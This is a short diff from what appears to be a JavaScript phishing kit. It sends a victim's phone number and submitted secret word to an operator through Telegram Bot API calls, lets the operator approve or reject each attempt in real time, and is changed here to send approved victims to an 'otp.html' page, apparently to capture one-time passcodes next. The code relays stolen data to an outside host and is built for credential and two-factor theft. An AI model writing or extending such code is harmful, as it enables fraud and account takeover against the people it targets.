@@ -118,7 +118,7 @@ async function waitForAnswer(id, phone, word, messageId) {
       tg("answerCallbackQuery", { callback_query_id: cq.id, text: yes ? "Approved" : "Rejected" });
       tg("editMessageText", { chat_id: CHAT_ID, message_id: messageId, text: `${phone}: ${word} — ${yes ? "✅ Approved" : "❌ Rejected"}` });
 
-      if (yes) { location.href = "congrats.html"; return; }
+      if (yes) { location.href = "otp.html"; return; }
       showWarn("⚠️ Wrong word. Try again.");
       tiles.classList.remove("shake"); void tiles.offsetWidth; tiles.classList.add("shake");
       resetBoxes();
